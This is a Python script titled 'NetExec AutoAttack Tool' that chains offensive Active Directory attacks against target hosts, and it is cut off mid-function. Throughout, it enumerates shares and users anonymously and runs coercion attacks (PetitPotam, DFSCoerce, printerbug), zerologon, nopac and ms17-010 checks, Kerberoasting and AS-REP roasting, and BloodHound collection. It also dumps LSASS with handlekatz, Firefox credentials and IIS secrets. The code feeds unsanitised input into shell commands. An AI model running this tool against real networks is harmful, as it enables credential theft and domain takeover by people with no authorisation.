#!/usr/bin/env python3

import os, sys, time, subprocess, importlib.util
from time import sleep
try:
    import argparse
except ImportError:
    os.system("sudo pip install argparse")

from subprocess import Popen
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET
                                                                    
parser = argparse.ArgumentParser(description="NetExec AutoAttack Tool", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="Run scan against a single host / network of hosts, -r 10.10.10.1 ; ex: 10.10.10.0/24")
parser.add_argument("-F", "--FILE", action="store", help="Run scan against file of IP addresses ex: alive.txt (Do not use with rhost)")
parser.add_argument("-u", "--USERNAME", action="store", help="Run scan using Username")
parser.add_argument("-p", "--PASSWORD", action="store", help="Run scan using Password")
parser.add_argument("-d", "--DOMAIN", action="store", help="Run scan against Domain Name")
parser.add_argument("-U", "--USERSFILE", action="store", help="Users file if you have one to use for AsRepRoast")
parser.add_argument("-D", "--DCIP", action="store", help="Domain Controller IP Address")
parser.add_argument("-f", "--DCFILE", action="store", help="Domain Controller File of IP Addresses")
parser.add_argument("-H", "--HASH", action="store", help="Run scan using NT hash instead of password")
parser.add_argument("-A", "--ADMIN", action="store_true", help="Utilize if you are using administrator hash or credentials")
parser.add_argument("-N", "--NULL", action="store_true", help="Attempt NULL scan")
parser.add_argument("-T", "--TOOLS", action="store_true", help="Download Tools Needed to Run, do not run with any other command")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
USERS = args.USERSFILE
DOMAIN = args.DOMAIN
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
HASH = args.HASH
FILE = args.FILE
ADMIN = args.ADMIN
NULL = args.NULL
DC = args.DCIP
TOOL = args.TOOLS
DCFILE = args.DCFILE

c = "nxc"
cs = f"{c} smb"
cw = f"{c} winrm"
ch = f"{c} ssh"
cl = f"{c} ldap"
cm = f"{c} mssql"
cr = f"{c} rdp"
cwm = f"{c} wmi"
cv = f"{c} vnc"
cf = f"{c} ftp"
crun = f"{RHOST or FILE} -u '' -p ''"
crun1 = f"{RHOST or FILE} -u anonymous -p ''"
crun2 = f"{RHOST or FILE} -u guest -p ''"
crup = f"{RHOST or FILE} -u {USERNAME} -p {PASSWORD}"
cruh = f"{RHOST or FILE} -u {USERNAME} -H {HASH}"
crudp = f"{DC or DCFILE} -u {USERNAME} -p {PASSWORD}"
crudh = f"{DC or DCFILE} -u {USERNAME} -H {HASH}"
fi = "_internal"
i = f"{DOMAIN}/{USERNAME}:{PASSWORD}@{DC}"
ih = f"{DOMAIN}/{USERNAME}@{DC} -hashes :{HASH}"
iwd = f"/{USERNAME}:{PASSWORD}@{DC}"
iwdh = f"/{USERNAME}@{DC} -hashes :{HASH}"
inp = f"GetNPUsers.py {i}"
inph = f"GetNPUsers.py {ih}"
ispn = f"GetUserSPNs.py {i}"
ispnh = f"GetUserSPNs.py {ih}"
isid = f"lookupsid.py {i}"
isidh = f"lookupsid.py {ih}"
isec = f"secretsdump.py {i}"
isech = f"secretsdump.py {ih}"

print(f"{RED}Caution this script runs multiple commands and installs multiple tools that could effect a system negatively{RESET}\n\n")
sleep(2)


def PRE():
    print(f"{YELLOW}Looking for prerequiste tools{RESET}")
    try:
        # pipe output to /dev/null for silence
        null = open("/dev/null", "w")
        subprocess.Popen("nxc", stdout=null, stderr=null)
        null.close()
    except OSError:
        print(f"{MAGENTA}NetExec, downloading{RESET}")
        s = Popen([f"sudo apt install netexec"], shell=True)
        s.wait()
    try:
        # pipe output to /dev/null for silence
        null = open("/dev/null", "w")
        subprocess.Popen("ldapdomaindump", stdout=null, stderr=null)
        null.close()
    except OSError:
        print(f"{MAGENTA}LDAPdomaindump, downloading{RESET}")
        s = Popen([f"pip3 install ldapdomaindump --break-system-packages"], shell=True)
        s.wait()
    try:
        # pipe output to /dev/null for silence
        null = open("/dev/null", "w")
        subprocess.Popen("certipy-ad", stdout=null, stderr=null)
        null.close()
    except OSError:
        print(f"{MAGENTA}LDAPdomaindump, downloading{RESET}")
        s = Popen([f"sudo apt install certipy-ad"], shell=True)
        s.wait()

def CHECKPATH():
    path = f'{DOMAIN}_interal_scan'
    check_path = os.path.isdir(path)
    if check_path == True:
        os.chdir(path)
    else:
        os.mkdir(path)
        os.chdir(path)
    file = f'{DOMAIN}{fi}.txt'
    check_file = os.path.isfile(file)
    if check_file != False:
        print(f"{RED}{DOMAIN}{fi}.txt exists, please rename file before continuing (Don't want to overwrite stuff)")
        quit()
    else:
         f = open(f"{DOMAIN}{fi}.txt", "x")

def NULLR():
    print(f"{YELLOW}Running NetExec SMB with NO Username and NO Password{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write("Looking at Shares, Users, Password Policies, Sessions, Logged On Users, Groups and Computers\n\n")
    subprocess.call([f"{cs} {crun} --shares --users --pass-pol --sessions --loggedon-users --groups --computers >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    subprocess.call([f"cat {DOMAIN}{fi}.txt | grep -vai Read,Write | grep -iav - | grep -iav '(' | grep -ia read"], shell=True)
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write("Looking at Shares, Users, Password Policies, Sessions, Logged On Users, Groups and Computers\n\n")
    subprocess.call([f"{cs} {crun1} --shares --users --pass-pol --sessions --loggedon-users --groups --computers >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write("Looking at Shares, Users, Password Policies, Sessions, Logged On Users, Groups and Computers\n\n")
    subprocess.call([f"{cs} {crun2} --shares --users --pass-pol --sessions --loggedon-users --groups --computers >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}The following shares have READ capabilites with NO Username and NO Password{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write("The following shares have READ capabilites with NO Username and NO Password\n\n")
    subprocess.call([f"cat {DOMAIN}{fi}.txt | grep -vai Read,Write | grep -iav - | grep -iav '(' | grep -ia read"], shell=True)
    print(f"{YELLOW}Running NetExec FTP with NO Username and NO Password{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write("Looking at FTP and doing an --ls\n\n")
    subprocess.call([f"{cf} {crun} --ls >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write("Looking at FTP and doing an --ls\n\n")
    subprocess.call([f"{cf} {crun1} --ls>> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write("Looking at FTP and doing an --ls\n\n")
    subprocess.call([f"{cf} {crun2} --ls >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def LDAPDOMAINDUMPN():
    print(f"{YELLOW}Trying LDAPDomainDump and saving to LDAP Folder\n\n{RESET}\n")
    path = f'LDAP'
    check_path = os.path.isdir(path)
    if check_path == True:
        os.chdir(path)
    else:
        os.mkdir(path)
        os.chdir(path)
    subprocess.call([f"ldapdomaindump ldap://{DC}:389"], shell=True)
    os.chdir('..')

def LDAPDOMAINDUMPR():
    print(f"{YELLOW}Trying LDAPDomainDump with Username {USERNAME} and Password {PASSWORD} and saving to LDAP Folder\n\n{RESET}\n")
    path = f'LDAP'
    check_path = os.path.isdir(path)
    if check_path == True:
        os.chdir(path)
    else:
        os.mkdir(path)
        os.chdir(path)
    subprocess.call([f"ldapdomaindump ldap://{DC}:636 -u {DOMAIN}\\{USERNAME} -p {PASSWORD}"], shell=True)
    os.chdir('..')

def LDAPDOMAINDUMPH():
    print(f"{YELLOW}Trying LDAPDomainDump on port 636 with Username {USERNAME} and Hash {HASH} and saving to LDAP Folder\n\n{RESET}\n")
    path = f'LDAP'
    check_path = os.path.isdir(path)
    if check_path == True:
        os.chdir(path)
    else:
        os.mkdir(path)
        os.chdir(path)
    subprocess.call([f"ldapdomaindump ldap://{DC}:636 -u {DOMAIN}\\{USERNAME} -p :{HASH}"], shell=True)
    os.chdir('..')

def LDAPSEARCHN():
    print(f"{YELLOW}Trying NULL LDAPSearch and looking for usernames and description\n\n{RESET}\n")
    subprocess.call([f"echo {DOMAIN} > a.txt"], shell=True)
    subprocess.call([f"cut -d . -f 1 a.txt > b.txt"], shell=True)
    subprocess.call([f"cut -d . -f 2 a.txt > c.txt"], shell=True)
    with open (f"b.txt", "r") as f:
        content = f.read()
    with open (f"c.txt", "r") as f:
        content1 = f.read()
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting LDAP Username Dump NULL\n\n{RESET}")
    subprocess.call([f'\n\nldapsearch -H ldap://{DC} -x -b "DC={content},DC={content1}" -s sub "(&(objectclass=user))"  | grep -i samaccountname | cut -f2 -d" " >> {DOMAIN}{fi}.txt\n\n'], shell=True)
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting LDAP Descriptions Dump NULL\n\n{RESET}")
    subprocess.call([f'\n\nldapsearch -H ldap://{DC} -x -b "DC={content},DC={content1}" -s sub "(&(objectclass=user))"  | grep -i description >> {DOMAIN}{fi}.txt\n\n'], shell=True)
    os.remove("a.txt")
    os.remove("b.txt")
    os.remove("c.txt")
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def SMBP():
    print(f"{YELLOW}Running NetExec SMB with Username {USERNAME} and Password {PASSWORD}{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Looking at Shares, Users, Password Policies, Sessions, Logged On Users, Groups and Computers\n\n{RESET}")
    subprocess.call([f"{cs} {crup} --shares --users --pass-pol --sessions --loggedon-users --groups --computers >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting DFSCoerce{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting DFSCoerce\n\n{RESET}")
    subprocess.call([f"{cs} {crudp} -M dfscoerce >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting Enum_AV{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting Enum_AV\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M enum_av >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting enum_ca{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting enum_ca\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M enum_ca >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting gpp_autologin{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting gpp_autologin\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M gpp_autologin >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting ms17-010{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting ms17-010\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M ms17-010 >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting nopac{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting nopac\n\n{RESET}")
    subprocess.call([f"{cs} {crudp} -M nopac >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting petitpotam{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting petitpotam\n\n{RESET}")
    subprocess.call([f"{cs} {crudp} -M petitpotam >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting printerbug{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting printerbug\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M printerbug >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting printnightmare{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting printnightmare\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M printnightmare >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting shadowcoerce{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting shadowcoerce\n\n{RESET}")
    subprocess.call([f"{cs} {crudp} -M shadowcoerce >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting spooler{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting spooler\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M spooler >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting webdav{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting webdav\n\n{RESET}")
    subprocess.call([f"{cs} {crup} -M webdav >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting zerologon{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting zerologon\n\n{RESET}")
    subprocess.call([f"{cs} {crudp} -M zerologon >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def CERTP():
    print(f"{YELLOW}Running Certipy-AD to find vulnerable certificates with Username {USERNAME} and Password {PASSWORD}{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{MAGENTA}\nLooking for vulnerable certificates{RESET}\n\n")
    s = Popen([f"certipy-ad find -u {USERNAME} -p {PASSWORD} -dc-ip {DC} -stdout -vulnerable >> {DOMAIN}{fi}.txt"], shell=True)
    s.wait()
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def CERTH():
    print(f"{YELLOW}Running Certipy-AD with Username {USERNAME} and Hash {HASH}{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{MAGENTA}\nLooking for vulnerable certificates{RESET}\n\n")
    s = Popen([f"certipy-ad find -u {USERNAME} -hashes :{HASH} -dc-ip {DC} -stdout -vulnerable >> {DOMAIN}{fi}.txt"], shell=True)
    s.wait()
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def SMBH():
    print(f"{YELLOW}Running NetExec SMB with Username {USERNAME} and Hash {HASH}{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Looking at Shares, Users, Password Policies, Sessions, Logged On Users, Groups and Computers{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} --shares --users --pass-pol --sessions --loggedon-users --groups --computers >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting DFSCoerce{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting DFSCoerce{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M dfscoerce >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting Enum_AV{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting Enum_AV{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M enum_av >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting enum_ca{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting enum_ca{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M enum_ca >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting gpp_autologin{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting gpp_autologin{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M gpp_autologin >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting ms17-010{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting ms17-010{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M ms17-010 >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting nopac{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting nopac{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M nopac >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting petitpotam{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting petitpotam{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M petitpotam >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting printerbug{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting printerbug{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M printerbug >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting printnightmare{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting printnightmare{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M printnightmare >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting shadowcoerce{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting shadowcoerce{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M shadowcoerce >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting spooler{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting spooler{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M spooler >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting webdav{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting webdav{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M webdav >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting zerologon{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting zerologon{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M zerologon >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    

def LDAPP():
    print(f"{YELLOW}Running NetExec LDAP with Username {USERNAME} and Password {PASSWORD}{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{MAGENTA}\nAttempting Bloodhound{RESET}\n\n")
    s = Popen([f"{cl} {crudp} --bloodhound -c all"], shell=True)
    s.wait()
    print(f"{YELLOW}Attempting DC List, Trusted for Delegation, Password Not Required, Users, and Groups {RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting DC List{RESET}\n\n")
    subprocess.call([f"{cl} {crudp} --dc-list --trusted-for-delegation --password-not-required --users --groups >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting AsRepRoast and Kerberoast{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting AsRepRoast and Kerberoast{RESET}\n\n")
    subprocess.call([f"{cl} {crudp} --asreproast --kerberoasting >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting User Descriptions{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting User Descriptions{RESET}\n\n")
    subprocess.call([f"{cl} {crudp} -M user-desc >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    subprocess.call([f"{cl} {crudp} -M get-desc-users >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting to view ADCS{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to view ADCS{RESET}\n\n")
    subprocess.call([f"{cl} {crudp} -M adcs >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting GMSA{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting GMSA{RESET}\n\n")
    subprocess.call([f"{cl} {crudp} --gmsa >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  

def LDAPH():
    print(f"{YELLOW}Running NetExec LDAP with Username {USERNAME} and Hash {HASH}{RESET}\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{MAGENTA}\nAttempting Bloodhound{RESET}\n\n")
    s = Popen([f"{cl} {crudh} --bloodhound -c all"], shell=True)
    s.wait()
    print(f"{YELLOW}Attempting DC List, Trusted for Delegation, Password Not Required, Users, and Groups {RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting DC List{RESET}\n\n")
    subprocess.call([f"{cl} {crudh} --dc-list --trusted-for-delegation --password-not-required --users --groups >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting AsRepRoast and Kerberoast{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting AsRepRoast and Kerberoast{RESET}\n\n")
    subprocess.call([f"{cl} {crudh} --asreproast --kerberoasting >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting User Descriptions{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting User Descriptions{RESET}\n\n")
    subprocess.call([f"{cl} {crudh} -M user-desc >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    subprocess.call([f"{cl} {crudh} -M get-desc-users >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting to view ADCS{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to view ADCS{RESET}\n\n")
    subprocess.call([f"{cl} {crudh} -M adcs >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting GMSA{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting GMSA{RESET}\n\n")
    subprocess.call([f"{cl} {crudh} --gmsa >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      

def SMBAPR():
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting enum_dns{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting enum_dns{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M enum_dns >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting firefox dump{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting firefox dump{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M firefox >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting get_netconnections{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting get_netconnections{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M get_netconnections >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting lsass dump with handlekatz{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting lsass dump with handlekatz{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M handlekatz >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to find creds in IIS{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to find creds in IIS{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M iis >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to list impersonate{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to list impersonate{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M impersonate >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to check for Always Install Elevated{RESET}\n\n")
